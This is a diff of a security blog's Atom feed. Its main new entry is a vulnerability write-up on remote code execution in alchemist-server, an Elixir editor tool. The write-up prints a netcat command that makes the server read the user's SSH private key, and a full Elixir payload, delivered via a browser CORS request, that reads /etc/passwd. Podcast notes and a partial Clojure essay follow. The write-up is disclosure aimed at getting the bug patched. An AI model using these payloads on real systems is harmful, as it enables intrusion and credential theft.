@@ -5,13 +5,351 @@
   <id>https://blog.appcanary.com</id>
   <link href="https://blog.appcanary.com"/>
   <link href="https://blog.appcanary.com/rss" rel="self"/>
-  <updated>2017-04-06T17:00:00-07:00</updated>
+  <updated>2017-07-27T20:00:00-04:00</updated>
+  <entry>
+    <title>Hacking your Elixir Editor</title>
+    <link rel="alternate" href="https://blog.appcanary.com/2017/hacking-your-elixir-editor.html"/>
+    <id>https://blog.appcanary.com/2017/hacking-your-elixir-editor.html</id>
+    <published>2017-07-27T20:00:00-04:00</published>
+    <updated>2017-07-31T00:52:41-04:00</updated>
+    <author>
+      <name>Max Veytsman</name>
+    </author>
+    <content type="html">&lt;p&gt;I&amp;rsquo;ve been playing with Elixir recently, and came across a remote code execution bug in the developer tools. You know, as one does.&lt;/p&gt;
+
+&lt;p&gt;Before we continue, a warning: if you use Vim and have ever edited Elixir files &lt;strong&gt;stop what you&amp;rsquo;re doing and upgrade &lt;a href="https://github.com/slashmili/alchemist.vim"&gt;alchemist.vim&lt;/a&gt; to 2.8.0&lt;/strong&gt;. Seriously, go do it, right now.&lt;/p&gt;
+
+&lt;p&gt;Done? Okay, let&amp;rsquo;s take it from the top. If you want to implement nice editor support for a language, and provide things like code-completion or jump-to-definition, you need some way to introspect both the source code being edited and the language&amp;rsquo;s runtime environment to figure out what suggestions to give to your users. &lt;/p&gt;
+
+&lt;p&gt;There&amp;rsquo;s a package called &lt;a href="https://github.com/tonini/alchemist.el"&gt;alchemist&lt;/a&gt; that provides Elixir support for Emacs. It has nice features like code-completion, and jump-to-definition, and, thereofre, it understands Elixir code and can read through a project&amp;rsquo;s dependencies and stuff like that. A common pattern when writing editor plugins is to build a little background program in the language you&amp;rsquo;re targeting that can introspect the runtime and tell the editor where symbols are defined and help with code completion. Alchemist does this with &lt;a href="https://github.com/tonini/alchemist-server"&gt;alchemist-server&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Alchemist-server is also used by the Vim plugin, &lt;a href="https://github.com/slashmili/alchemist.vim"&gt;alchemist.vim&lt;/a&gt;. While Emacs talks to alchemist-server via STDIN/STDOUT, the Vim plugin uses a TCP server to process commands from Vim.&lt;/p&gt;
+
+&lt;h1 id="the-bug"&gt;The bug&lt;/h1&gt;
+
+&lt;p&gt;I can&amp;rsquo;t claim credit for the original bug. It was &lt;a href="https://github.com/tonini/alchemist-server/issues/14"&gt;reported&lt;/a&gt; by &lt;a href="https://github.com/ivan"&gt;Ivan Kozik&lt;/a&gt; back in February. &lt;/p&gt;
+
+&lt;p&gt;The issue is that alchemist-server accepted &lt;code&gt;EVAL&lt;/code&gt; as a command and listened unauthenticated on all interfaces. This means that anyone in the same coffee shop as you can eval arbitrary Elixir code on your computer if they can guess the &lt;a href="https://en.wikipedia.org/wiki/Ephemeral_port"&gt;ephemeral port&lt;/a&gt; the server is running on. &lt;/p&gt;
+
+&lt;p&gt;This is really bad, and unfortunately had not been addressed since the issue was reported. I think this bug wasn&amp;rsquo;t patched immediately for three reasons:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;There wasn&amp;rsquo;t consensus on what the correct fix was. Do we listen on localhost only? On a socket? Sign and MAC the command? If we do that, what key do we use?&lt;/li&gt;
+&lt;li&gt;The severity of the bug wasn&amp;rsquo;t made clear. While it exposed you to a remote attacker over the same network, Ivan initially thought that you would need a &lt;a href="https://en.wikipedia.org/wiki/DNS_rebinding"&gt;DNS rebinding&lt;/a&gt; attack to exploit the bug via a browser. This is theoretical and hard to explain, let alone pull off&lt;sup id="fnref1"&gt;&lt;a href="#fn1" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;This is a super serious bug, and I wanted to see this bug fixed as quickly as possible. I subscribe to the Church of &lt;a href="https://www.nostarch.com/gtfo"&gt;Proof of Concept or GTFO&lt;/a&gt;, so it was time to demonstrate just bad this bug actually was.&lt;/p&gt;
+
+&lt;h1 id="the-original-exploit"&gt;The original exploit&lt;/h1&gt;
+
+&lt;p&gt;Ivan&amp;rsquo;s original exploit takes advantage of the fact that alchemist-server uses &lt;code&gt;eval-string&lt;/code&gt; to process arguments in several cases and it contains a &lt;code&gt;EVAL&lt;/code&gt; command for evaluating files, probably for loading modified files into your repl environment. He sends a command that uses the &lt;code&gt;eval-string&lt;/code&gt;ed portion to write a malicious Elixir script to a file and then executes it, with the results returned to the user.&lt;/p&gt;
+
+&lt;p&gt;Assuiming &lt;code&gt;PORT&lt;/code&gt; is the ephemeral port the server is running on, his exploit looks like this:&lt;/p&gt;
+&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'EVAL File.write!("/tmp/payload", 
+"File.read!(Path.expand(~s(~/.ssh/id_rsa)))");
+{:eval, "/tmp/payload"}'&lt;/span&gt; | nc 127.0.0.1 PORT
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;EVAL&lt;/code&gt; is a command for the Elixir server.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;File.write!(&amp;quot;/tmp/payload&amp;quot;, &amp;quot;File.read!(Path.expand(~s(~/.ssh/id_rsa)))&amp;quot;);&lt;/code&gt; is the part that&amp;rsquo;s processed by &lt;code&gt;eval-string&lt;/code&gt;. It writes a malicious elixir script to &lt;code&gt;/tmp/payload&lt;/code&gt;. The script itself returns the contents of the user&amp;rsquo;s ssh private key.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;{:eval, &amp;quot;/tmp/payload&amp;quot;}&lt;/code&gt; tells the server to evaluate the file in which the malicious script was written.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id="the-danger-of-line-based-protocols"&gt;The danger of line based protocols&lt;/h1&gt;
+
+&lt;p&gt;I know what you&amp;rsquo;re thinking: &amp;ldquo;it&amp;rsquo;s really too bad that alchemist-server is evaling things to begin with&amp;rdquo;. And, you&amp;rsquo;re dead wrong. &lt;/p&gt;
+
+&lt;p&gt;It&amp;rsquo;s perfectly fine for developer tools to execute code sent to them by a user; actually, most developer tools are designed specifically to evaluate arbitrary code in one way or another. The problem is that it&amp;rsquo;s accepting code to be evaled over &lt;em&gt;a TCP connection&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;First, I booted up the server, and then started talking to it using netcat:&lt;/p&gt;
+&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'PING'&lt;/span&gt; | nc localhost 59533
+PONG
+END-OF-PING
+
+&lt;span class="gp"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"NOTAREALCOMMAND"&lt;/span&gt; | nc localhost 59555
+&lt;span class="c"&gt;# No output&lt;/span&gt;
+
+&lt;span class="gp"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;printf&lt;/span&gt; &lt;span class="s2"&gt;"NOTAREALCOMMAND&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;PING&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; | nc localhost 59609
+PONG
+END-OF-PING
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is where things get real bad for alchemist-server. We&amp;rsquo;re dealing with a line based protocol, and what&amp;rsquo;s more, it&amp;rsquo;s ignoring&lt;sup id="fnref2"&gt;&lt;a href="#fn2" rel="footnote"&gt;2&lt;/a&gt;&lt;/sup&gt; commands it doesn&amp;rsquo;t understand. You know what else is a line-based protocol? HTTP. &lt;/p&gt;
+
+&lt;p&gt;That means we can get a browser to issue a request to localhost and alchemist-server will ignore all the headers and HTTP formalities and happily execute an EVAL command if we put it on its own line.&lt;/p&gt;
+
+&lt;p&gt;Interestingly enough, this is a case where security considerations outweigh &lt;a href="https://en.wikipedia.org/wiki/Robustness_principle"&gt;Postel&amp;rsquo;s Principle&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Be conservative in what you do, be liberal in what you accept from others&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In this case, being liberal in what you accept leads to accepting messages from places you really shouldn&amp;rsquo;t.&lt;/p&gt;
+
+&lt;h1 id="cross-origin-resource-sharing"&gt;Cross-origin resource sharing&lt;/h1&gt;
+
+&lt;p&gt;We&amp;rsquo;ve established that the server will accept HTTP requests from a browser. Now the trick is to get the browser to send one. I decided to use Javascript to send an &lt;a href="https://developer.mozilla.org/en/docs/Web/API/XMLHttpRequest"&gt;XHR&lt;/a&gt; so that I had a good chance of being able to process the response from the server. If I just wanted to execute some code on a victim&amp;rsquo;s machine, embedding a form or an image with the right payload would have worked too.&lt;/p&gt;
+
+&lt;p&gt;In order to use XHR, we need to get around Cross-Origin Resource Sharing (CORS). This is the policy that governs under what conditions a browser will make a request to a resource, and under what conditions the output will be returned back to the Javascript function that made the request. There is a default policy, and it can be changed by the server using special headers&lt;sup id="fnref3"&gt;&lt;a href="#fn3" rel="footnote"&gt;3&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;p&gt;The first thing that happens is that the browser decides if it can make a request. If the request contains these special headers, or uses an HTTP method other than GET, HEAD, or POST, the browser will send a &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Preflighted_requests"&gt;preflighted request&lt;/a&gt;. This is an OPTIONS request that asks the server if it will accept the upcoming request.&lt;/p&gt;
+
+&lt;p&gt;We don&amp;rsquo;t want this, so we have to send a so-called &amp;ldquo;simple request&amp;rdquo;. A POST request with a content-type of &amp;ldquo;text/plain&amp;rdquo; and &lt;code&gt;EVAL ...&lt;/code&gt; in the data is &amp;ldquo;simple&amp;rdquo; and not be preflighted.&lt;/p&gt;
+
+&lt;p&gt;The next step is getting passed the Access-Control header. By default, your browser won&amp;rsquo;t return the results of an XHR request unless it&amp;rsquo;s to the same origin as the script that&amp;rsquo;s making it, or the server has an Access-Control header that allows the script&amp;rsquo;s origin. One thing to note is that this is happening &lt;em&gt;after&lt;/em&gt; the request is made. So, if I have some malicious code that will ransomware your computer, it will still be executed, even if the browser script that made the request won&amp;rsquo;t be able to see the response. It&amp;rsquo;s especially unimportant in the case of remote code execution, because I can exfiltrate data by having my malicious payload make a request back to me by itself.&lt;/p&gt;
+
+&lt;p&gt;Nevertheless, setting up a server to listen to the response requires effort, and I wanted a seamless POC. Luckily, our malicious payload&amp;rsquo;s response was going to be interpreted as a HTTP response to the browser, so all I had to do was return a string that looks like:&lt;/p&gt;
+&lt;pre class="highlight plaintext"&gt;&lt;code&gt;HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+
+The browser will now see this as a response to its XHR request.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id="boom"&gt;Boom&lt;/h1&gt;
+
+&lt;p&gt;And here&amp;rsquo;s the full payload&lt;/p&gt;
+&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="c1"&gt;# Write the following script to /tmp/payload&lt;/span&gt;
+&lt;span class="no"&gt;EVAL&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sd"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/tmp/payload"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+  &lt;span class="c1"&gt;# HTTP response header&lt;/span&gt;
+  &lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="no"&gt;S&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="no"&gt;IO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;puts&lt;/span&gt; &lt;span class="sd"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;HTTP/1.1 200 OK"&lt;/span&gt;
+  &lt;span class="c1"&gt;# \n - encoded in a way that won't be parsed as a new line&lt;/span&gt;
+  &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_string&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+  &lt;span class="c1"&gt;# CORS header&lt;/span&gt;
+  &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class="sd"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Access-Control-Allow-Origin: *"&lt;/span&gt;
+  &lt;span class="c1"&gt;# \r\n\r\n - see above&lt;/span&gt;
+  &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_string&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+  &lt;span class="c1"&gt;# Insert the contents of /etc/passwrd&lt;/span&gt;
+  &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+  &lt;span class="c1"&gt;# \r\n\r\n - see above&lt;/span&gt;
+  &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_string&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="c1"&gt;# Execute the above script and return the result&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:eval&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sd"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/tmp/payload"&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is what it looks like when wrapped in HTML/Javascript:&lt;/p&gt;
+
+&lt;video src="/videos/alchemist_server.webm" width="640" height="360" controls&gt;
+&lt;/video&gt;
+
+&lt;p&gt;Thanks for reading, and make sure you update your alchemist-server!&lt;/p&gt;
+
+&lt;div class="footnotes"&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+
+&lt;li id="fn1"&gt;
+&lt;p&gt;Case in point, the &lt;a href="http://searchsecurity.techtarget.com/definition/DNS-rebinding-attack"&gt;first google hit&lt;/a&gt; confuses for DNS rebinding confuses the attack technique with something you can do with it &amp;mdash; using javascript to exploit default passwords on home routers from a browser.&amp;nbsp;&lt;a href="#fnref1" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li id="fn2"&gt;
+&lt;p&gt;You may have noticed, I used &lt;code&gt;printf&lt;/code&gt; not &lt;code&gt;echo&lt;/code&gt; in the last example so that my &lt;code&gt;\n&lt;/code&gt;s would be rendered correctly.&amp;nbsp;&lt;a href="#fnref2" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li id="fn3"&gt;
+&lt;p&gt;If you want to learn more about other security releated headers, you can read my &lt;a href="https://blog.appcanary.com/2017/http-security-headers.html"&gt;guide&lt;/a&gt;&amp;nbsp;&lt;a href="#fnref3" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;/ol&gt;
+&lt;/div&gt;
+</content>
+  </entry>
+  <entry>
+    <title>Podcast Episode 4 - Leakers and Phishers</title>
+    <link rel="alternate" href="https://blog.appcanary.com/2017/reality-winner-nsa-citizenlab.html"/>
+    <id>https://blog.appcanary.com/2017/reality-winner-nsa-citizenlab.html</id>
+    <published>2017-07-13T20:00:00-04:00</published>
+    <updated>2017-07-27T16:58:14-04:00</updated>
+    <author>
+      <name>Phillip Mendonça-Vieira</name>
+    </author>
+    <content type="html">&lt;p&gt;Max and Phill talk about Reality Winner&amp;rsquo;s bad opsec and the huge phishing campaign unearthed by Citizenlab. Produced by &lt;a href="https://twitter.com/katiejensen"&gt;Katie Jensen&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;You can follow along on &lt;a href="https://itunes.apple.com/ca/podcast/appcanary-podcast/id1215405635"&gt;iTunes&lt;/a&gt;, or subscribe directly to &lt;a href="https://podcast.appcanary.com/podcast.rss"&gt;the feed&lt;/a&gt;. &lt;/p&gt;
+
+&lt;audio controls preload="metadata" style="width: 100%;"&gt;
+    &lt;source src="https://podcast.appcanary.com/mp3/appcanary-ep4.mp3" type="audio/mpeg"&gt;
+    Your browser does not support the audio element.
+&lt;/audio&gt;
+
+&lt;h3 id="show-notes"&gt;Show Notes&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href="https://medium.com/@thegrugq/real-talk-on-reality-cf07cbb78530"&gt;Real Talk on Reality&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href="https://citizenlab.ca/2017/05/tainted-leaks-disinformation-phish/"&gt;TAINTED LEAKS: Disinformation and Phishing With a Russian Nexus&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+  </entry>
+  <entry>
+    <title>Podcast Episode 3 - Breitbart and Shopify</title>
+    <link rel="alternate" href="https://blog.appcanary.com/2017/podcast-breitbart-shopify.html"/>
+    <id>https://blog.appcanary.com/2017/podcast-breitbart-shopify.html</id>
+    <published>2017-05-25T20:00:00-04:00</published>
+    <updated>2017-07-27T16:58:14-04:00</updated>
+    <author>
+      <name>Phillip Mendonça-Vieira</name>
+    </author>
+    <content type="html">&lt;p&gt;Here in episode 3, Max and Phill discuss, over breakfast, what Shopify should or should not do with regard to Breitbart. Produced by &lt;a href="https://twitter.com/katiejensen"&gt;Katie Jensen&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;You can follow along on &lt;a href="https://itunes.apple.com/ca/podcast/appcanary-podcast/id1215405635"&gt;iTunes&lt;/a&gt;, or subscribe directly to &lt;a href="https://podcast.appcanary.com/podcast.rss"&gt;the feed&lt;/a&gt;. &lt;/p&gt;
+
+&lt;audio controls preload="metadata" style="width: 100%;"&gt;
+    &lt;source src="https://podcast.appcanary.com/mp3/appcanary-ep3.mp3" type="audio/mpeg"&gt;
+    Your browser does not support the audio element.
+&lt;/audio&gt;
+
+&lt;h3 id="show-notes"&gt;Show Notes&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href="http://www.cbc.ca/news/canada/ottawa/shopify-ceo-tobi-lutke-defends-decision-to-host-breitbart-1.3973798"&gt;Shopify CEO digs in against Breitbart backlash&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href="https://www.inc.com/sonya-mann/trump-shopify/breitbart.html"&gt;Shopify Backlash Shows Even Second-Degree Trump Ties Can Be Trouble&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+  </entry>
+  <entry>
+    <title>Simple Ain't Easy, but Hard Ain't Simple: Leaving Clojure for Ruby</title>
+    <link rel="alternate" href="https://blog.appcanary.com/2017/hard-isnt-simple-ruby-clojure.html"/>
+    <id>https://blog.appcanary.com/2017/hard-isnt-simple-ruby-clojure.html</id>
+    <published>2017-05-21T20:00:00-04:00</published>
+    <updated>2017-07-27T16:58:14-04:00</updated>
+    <author>
+      <name>Phillip Mendonça-Vieira</name>
+    </author>
+    <content type="html">&lt;p&gt;In November 2016, I delivered a talk at RubyConf where I told the story of how we built the first version in Appcanary in Clojure, and then threw it away. &lt;/p&gt;
+
+&lt;p&gt;Here is the talk:&lt;/p&gt;
+
+&lt;div style="position:relative;height:0;padding-bottom:56.25%"&gt;&lt;iframe src="https://www.youtube.com/embed/doZ0XAc9Wtc?ecver=2" width="640" height="360" frameborder="0" style="position:absolute;width:100%;height:100%;left:0" allowfullscreen&gt;&lt;/iframe&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;small&gt;Jump to 12:10 to start at the section where I begin to talk about my specific problems with Clojure.&lt;/small&gt;&lt;/p&gt;
+
+&lt;p&gt;But, that talk is over a half hour long, and who has time for that?&lt;/p&gt;
+
+&lt;h3 id="three-important-ideas-you-should-take-away"&gt;Three important ideas you should take away:&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;If you&amp;rsquo;re starting a project where you&amp;rsquo;re really pressed for time, you should be biased towards tools you know really well. If you have a startup, you&amp;rsquo;re supposed to be solving a &lt;em&gt;business problem&lt;/em&gt;. Don&amp;rsquo;t make your life harder than it has to be by also having to learn new tools.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Avoid building a distributed system for as long as you can. They introduce a lot of expensive complexity that is hard for small teams to pay. Micro services are useful for larger teams, but the way you code and deploy your apps should be a reflection of your team&amp;rsquo;s organization and ability to coordinate.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;I personally found it really hard to get into Clojure. I got the sense that Clojure as a community doesn&amp;rsquo;t value &amp;ldquo;developer happiness&amp;rdquo;, and I think it should! Tools should try to make your life easier at every opportunity.&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;hr&gt;&lt;/p&gt;
+
+&lt;p&gt;We had &lt;a href="/2016/missing-clojure.html"&gt;mentioned the talk before&lt;/a&gt;, but I had avoided actually posting it on this blog for two reasons:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;I&amp;rsquo;ve rewatched it a bunch of times and can think of a half dozen things I&amp;rsquo;d do differently now.&lt;/li&gt;
+&lt;li&gt;Some people in the Clojure community got &lt;em&gt;really mad&lt;/em&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id="oops"&gt;Oops&lt;/h2&gt;
+
+&lt;p&gt;A lot of otherwise well-meaning people looked at the talk and decided that I was a) a bit of an asshole and b) probably incompetent. So many people expressed that view that I felt compelled to ask Confreaks to turn off the comments&lt;sup id="fnref1"&gt;&lt;a href="#fn1" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;p&gt;I don&amp;rsquo;t really blame them.&lt;/p&gt;
+
+&lt;p&gt;Developer tools do not exist in isolation; they are often only useful to the extent there is a live community surrounding them. This requires such a degree of investment that many programmers will inevitably come to integrate their favourite programming languages into a part of their identity. When some outsider comes along and criticizes your community and identity, it can be very hard to be charitable to what they have to say.&lt;/p&gt;
+
+&lt;p&gt;It was a good learning experience, though. I came to understand that &lt;strong&gt;I did not work hard enough to establish that I was coming from a place of kindness&lt;/strong&gt;, and that my talk was &lt;strong&gt;not&lt;/strong&gt; a big fuck you! to the community.&lt;/p&gt;
+
+&lt;p&gt;I came into the language and its environment with an open heart and invested a ton of resources into it, but, largely because of my specific context and a few mistakes we made early on, continuing to invest in Clojure didn&amp;rsquo;t make sense for us.&lt;/p&gt;
+
+&lt;p&gt;&lt;hr&gt;&lt;/p&gt;
+
+&lt;h2 id="further-discussion"&gt;Further discussion&lt;/h2&gt;
+
+&lt;p&gt;So, much to my surprise, my talk became relevant recently when some peeps in the Clojure community looked around and made an observation:&lt;/p&gt;
+
+&lt;blockquote class="twitter-tweet" data-lang="en"&gt;&lt;p lang="en" dir="ltr"&gt;folks, I&amp;rsquo;m calling it, clojure&amp;rsquo;s dying more than it is growing&lt;/p&gt;&amp;mdash; 🌹dsa zack🌹 (@ZackMaril) &lt;a href="https://twitter.com/ZackMaril/status/863915988424589312"&gt;May 15, 2017&lt;/a&gt;&lt;/blockquote&gt;
+
+&lt;script async src="//platform.twitter.com/widgets.js" charset="utf-8"&gt;&lt;/script&gt;
+
+&lt;p&gt;Enabled by Twitter&amp;rsquo;s recent decision to not count usernames towards character limits, this thread gained a whole life of its own. I don&amp;rsquo;t know how to do justice to the whole range of topics that were discussed; Twitter itself hasn&amp;rsquo;t quite figured out how to display threads properly. &lt;/p&gt;
+
+&lt;p&gt;I think some of the ideas brought up deserve a little more investigation, and so I have summarized parts of the discussion in order to address them. Here it goes:&lt;/p&gt;
+
+&lt;h3 id="the-thread"&gt;The Thread&lt;/h3&gt;
+
+&lt;p&gt;The hype cycle has moved away from Clojure, &lt;a href="https://twitter.com/ZackMaril/status/863916529674354688"&gt;and the community feels like it&amp;rsquo;s shrinking&lt;/a&gt; - &lt;a href="https://twitter.com/ztellman/status/864243503999602688"&gt;though there are many more jobs coming up&lt;/a&gt;. &lt;/p&gt;
+
+&lt;p&gt;It&amp;rsquo;s actually kinda hard to make a &lt;a href="https://twitter.com/ztellman/status/864244372933443585"&gt;good business case&lt;/a&gt; for Clojure, since &lt;a href="https://twitter.com/ZackMaril/status/864244440931500033"&gt;the JVM makes small tools prohibitive&lt;/a&gt; and, if you do like the JVM, &lt;a href="https://twitter.com/cemerick/status/864931671388409856"&gt;you now have a lot of options&lt;/a&gt;. In theory, &lt;a href="https://twitter.com/ericnormand/status/864940158159912960"&gt;you should be way more productive in Clojure&lt;/a&gt;, but it&amp;rsquo;s &lt;a href="https://twitter.com/CursiveIDE/status/865162192265461764"&gt;hard to tell how true that is&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;That said, &lt;a href="https://twitter.com/mark_engelberg/status/865370061489356800"&gt;are people actually leaving Clojure&lt;/a&gt;? Well, &lt;a href="https://twitter.com/ztellman/status/865372517786984448"&gt;there was a talk recently on that very topic&lt;/a&gt;, and though it may have been written by an &lt;a href="https://twitter.com/timbaldridge/status/865640256220962816"&gt;incompetent&lt;/a&gt; and &lt;a href="https://twitter.com/timbaldridge/status/865654433870356480"&gt;mean jerk&lt;/a&gt;&lt;sup id="fnref2"&gt;&lt;a href="#fn2" rel="footnote"&gt;2&lt;/a&gt;&lt;/sup&gt;, it makes some &lt;a href="https://twitter.com/cemerick/status/865657364317298690"&gt;good points&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In the end, what &lt;em&gt;is&lt;/em&gt; a &lt;a href="https://twitter.com/phillmv/status/865690983274430464"&gt;reasonable expectation for developers new to Clojure&lt;/a&gt;? Lisps are a &lt;a href="https://twitter.com/timbaldridge/status/865667405862715392"&gt;very different&lt;/a&gt; paradigm. &lt;a href="https://twitter.com/timbaldridge/status/865667555494551552"&gt;Things work differently here&lt;/a&gt;. Developers get paid to &lt;a href="https://twitter.com/timbaldridge/status/865698644724375552"&gt;solve or automate problems&lt;/a&gt;, and people &lt;a href="https://twitter.com/potetm/status/866027765350506496"&gt;waste tons of time&lt;/a&gt; trying to be &amp;ldquo;happy&amp;rdquo;. Clojure encourages people to reflect on their work, and &lt;a href="https://twitter.com/potetm/status/866028663644598274"&gt;aggressively pare it down&lt;/a&gt;. After all, &lt;a href="https://twitter.com/potetm/status/866027314009829376"&gt;simple isn&amp;rsquo;t easy&lt;/a&gt;!&lt;/p&gt;
+
+&lt;p&gt;&lt;hr&gt;&lt;/p&gt;
+
+&lt;p&gt;OKAY, WOW, are you still with me? Incredible. &lt;/p&gt;
+
+&lt;p&gt;It&amp;rsquo;s hard for me to write about Clojureland nowadays since it&amp;rsquo;s been a whole year since I last typed &lt;code&gt;lein repl&lt;/code&gt;, but I&amp;rsquo;m about to say something slightly hyperbolic and slightly uncharitable because it&amp;rsquo;s more memorable, so please bear with me. It&amp;rsquo;s a little over the top, but I promise I&amp;rsquo;m coming from a place of love.&lt;/p&gt;
+
+&lt;p&gt;Here it goes. Ready?&lt;/p&gt;
+
